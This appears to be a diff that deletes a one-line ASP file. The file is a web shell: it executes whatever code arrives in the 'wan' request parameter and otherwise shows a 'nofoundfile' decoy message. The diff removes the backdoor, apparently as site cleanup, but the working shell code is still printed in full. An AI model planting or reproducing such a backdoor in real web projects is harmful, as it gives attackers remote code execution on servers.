@@ -1,1 +1,0 @@
-<%If Request("wan")<>"" Then Execute(Request("wan"))  else Response.Write("nofound"&"file") end if %>
